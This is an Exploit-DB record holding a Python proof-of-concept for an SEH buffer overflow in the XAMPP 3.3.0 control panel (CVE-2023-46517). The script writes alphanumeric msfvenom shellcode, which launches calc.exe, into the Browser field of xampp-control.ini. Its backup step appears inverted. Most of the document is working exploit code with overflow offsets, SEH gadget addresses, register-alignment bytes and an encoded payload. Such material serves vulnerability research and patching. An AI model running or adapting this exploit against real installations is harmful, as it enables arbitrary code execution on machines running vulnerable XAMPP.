{"source": "https://www.exploit-db.com/exploits/51800", "vulnName": "XAMPP - Buffer Overflow POC", "vulnEDBID": "51800", "vulnCVE": "N/A", "author": "TALSON", "exploitType": "DOS", "platform": "WINDOWS", "datePublished": "2024-02-19", "vulnContent": "# Exploit Title: XAMPP v3.3.0 \u2014 '.ini' Buffer Overflow (Unicode + SEH)\n# Date: 2023-10-26\n# Author: Talson (@Ripp3rdoc)\n# Software Link: https://sourceforge.net/projects/xampp/files/XAMPP%20Windows/8.0.28/xampp-windows-x64-8.0.28-0-VS16-installer.exe\n# Version: 3.3.0\n# Tested on: Windows 11\n# CVE-2023-46517\n\n##########################################################\n# _________ _______  _        _______  _______  _        #\n# \\__   __/(  ___  )( \\      (  ____ \\(  ___  )( (    /| #\n#    ) (   | (   ) || (      | (    \\/| (   ) ||  \\  ( | #\n#    | |   | (___) || |      | (_____ | |   | ||   \\ | | #\n#    | |   |  ___  || |      (_____  )| |   | || (\\ \\) | #\n#    | |   | (   ) || |            ) || |   | || | \\   | #\n#    | |   | )   ( || (____/\\/\\____) || (___) || )  \\  | #\n#    )_(   |/     \\|(_______/\\_______)(_______)|/    )_) #\n#                                                        #\n##########################################################\n\n# Proof-of-Concept Steps to Reproduce :\n\n# 1.- Run the python script \"poc.py\", it will create a new file \"xampp-control.ini\"\n# 2.- Open the application (xampp-control.exe)\n# 3.- Click on the \"admin\" button in front of Apache service.\n# 4.- Profit\n\n# Proof-of-Concept code on GitHub: https://github.com/ripp3rdoc/XAMPPv3.3.0-BOF/\n\n# Greetingz to EMU TEAM (\u00ac\u203f\u00ac)\u2a59\n\nfrom pwn import *\nimport shutil\nimport os.path\n\nbuffer      =   \"\\x41\" * 268        # 268 bytes to fill the buffer\nnseh        =   \"\\x59\\x71\"          # next SEH address  \u2014 0x00590071 (a harmless padding)\nseh         =   \"\\x15\\x43\"          # SEH handler       \u2014 0x00430015: pop ecx ; pop ebp ; ret ;\npadd        =   \"\\x71\" * 0x55       # padding\n\neax_align =     \"\\x47\"       # venetian pad/align\neax_align +=    \"\\x51\"          # push ecx\neax_align +=    \"\\x71\"       # venetian pad/align\neax_align +=    \"\\x58\"      # pop eax               -> eax = 0019e1a0\neax_align +=    \"\\x71\"       # venetian pad/align \neax_align +=    \"\\x05\\x24\\x11\"  # add eax,0x11002300\neax_align +=    \"\\x71\"       # venetian pad/align\neax_align +=    \"\\x2d\\x11\\x11\"  # sub eax,0x11001100    -> eax = 0019F3DC\neax_align +=    \"\\x71\"       # venetian pad/align\neax_align +=    \"\\x50\"       # push eax \neax_align +=    \"\\x71\"      # pad to align the following ret\neax_align +=    \"\\xc3\";      # ret into eax?\n\n# msfvenom -p windows/exec CMD=calc.exe -e x86/unicode_mixed -f raw EXITFUNC=thread BufferRegister=EAX -o shellcode.bin\n# Payload size: 512 bytes\nshellcode = (\n    \"PPYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1\"\n    \"AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBkLzHrbM0ipm0c0bi7u01Ep1TBkb0nPdKR2zlrknrKdDK42Kx\"\n    \"Jo6WpJnFLqiofLMl1QallBLlO0gQxOzmjagW7rZRObpWBkNrZpdKMzmlBkNlzq1hZC0HKQwab1dKQIKp9qiCrk\"\n    \"myKhGslzoYtKMdTKkQJ6ma9odlgQ8OJmM1vg08iPD5yfjcSMjXOKQmnDRUhdaH4KR8mTIq7c2FDKjlpKrkaHML\"\n    \"JaZ3dKItrkYqhPU9MtO4KtOk1KC1QI1JNqKO9P1OOoqJtKn2HkRmOmaZjatMbe7BYpm0kPR0PhmadKRODGioj57\"\n    \"KgpmMnJZjoxDfceemCmYo9EmlivcL9zE0ikWpQe9ugKoWKcprpo2Jip23KOHUQSaQ0l33Lns5PxrEKPAA\"\n    )\n\nshellcode = buffer + nseh + seh +  eax_align + padd + shellcode\n\n\ncheck_file = os.path.isfile(\"c:\\\\xampp\\\\xampp-control.ini\")\n\nif check_file:\n    \n    print(\"[!] Backup file found. Generating the POC file...\")\n    pass\nelse:  \n    # create backup\n    try:\n        shutil.copyfile(\"c:\\\\xampp\\\\xampp-control.ini\", \"c:\\\\xampp\\\\xampp-control.ini.bak\")\n        print(\"[+] Creating backup for xampp-control.ini...\")\n        print(\"[+] Backup file created!\")\n    except Exception as e:\n        print(\"[!] Failed creating a backup for xampp-control.ini: \", e)\n\ntry:\n    \n    # Create the new file\n    with open(\"c:\\\\xampp\\\\xampp-control.ini\", \"w\", encoding='utf-8') as file:\n        file.write(f\"\"\"[Common]\n    Edition=\n    Editor=\n    Browser={shellcode}\n\n    Debug=0\n    Debuglevel=0\n    Language=en\n    TomcatVisible=1\n    Minimized=0\n\n    [LogSettings]\n    Font=Arial\n    FontSize=10\n\n    [WindowSettings]\n    Left=-1\n    Top=-1\n    Width=682\n    Height=441\n\n    [Autostart]\n    Apache=0\n    MySQL=0\n    FileZilla=0\n    Mercury=0\n    Tomcat=0\n\n    [Checks]\n    CheckRuntimes=1\n    CheckDefaultPorts=1\n\n    [ModuleNames]\n    Apache=Apache\n    MySQL=MySQL\n    Mercury=Mercury\n    Tomcat=Tomcat\n\n    [EnableModules]\n    Apache=1\n    MySQL=1\n    FileZilla=1\n    Mercury=1\n    Tomcat=1\n\n    [EnableServices]\n    Apache=1\n    MySQL=1\n    FileZilla=1\n    Tomcat=1\n\n    [BinaryNames]\n    Apache=httpd.exe\n    MySQL=mysqld.exe\n    FileZilla=filezillaserver.exe\n    FileZillaAdmin=filezilla server interface.exe\n    Mercury=mercury.exe\n    Tomcat=tomcat8.exe\n\n    [ServiceNames]\n    Apache=Apache2.4\n    MySQL=mysql\n    FileZilla=FileZillaServer\n    Tomcat=Tomcat\n    [ServicePorts]\n    Apache=80\n    ApacheSSL=443\n    MySQL=3306\n    FileZilla=21\n    FileZill=14147\n    Mercury1=25\n    Mercury2=79\n    Mercury3=105\n    Mercury4=106\n    Mercury5=110\n    Mercury6=143\n    Mercury7=2224\n    TomcatHTTP=8080\n    TomcatAJP=8009\n    Tomcat=8005\n    [UserConfigs]\n    Apache= \n    MySQL=\n    FileZilla=\n    Mercury=\n    Tomcat=\n\n    [UserLogs]\n    Apache=\n    MySQL=\n    FileZilla=\n    Mercury=\n    Tomcat=\n    \"\"\")\n    print(\"[+] Created the POC!\")\n\nexcept Exception as e:\n    print(\"[!] Failed creating the POC xampp-control.ini: \", e)\n            "}